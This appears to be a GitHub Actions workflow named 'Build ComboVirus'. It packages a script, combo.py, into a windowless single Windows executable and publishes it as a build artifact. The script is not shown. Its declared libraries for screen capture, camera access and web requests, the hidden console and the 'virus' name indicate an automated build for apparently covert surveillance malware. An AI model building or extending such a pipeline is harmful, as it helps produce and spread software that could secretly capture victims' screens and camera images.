name: Build ComboVirus
on: [push]
jobs:
  build:
    runs-on: windows-latest
    steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-python@v5
      with:
        python-version: '3.10'
    - name: Install dependencies
      run: pip install pyinstaller requests opencv-python mss
    - name: Build EXE
      run: pyinstaller --onefile --noconsole combo.py
    - name: Upload Artifact
      uses: actions/upload-artifact@v4
      with:
        name: combo
        path: dist/combo.exe
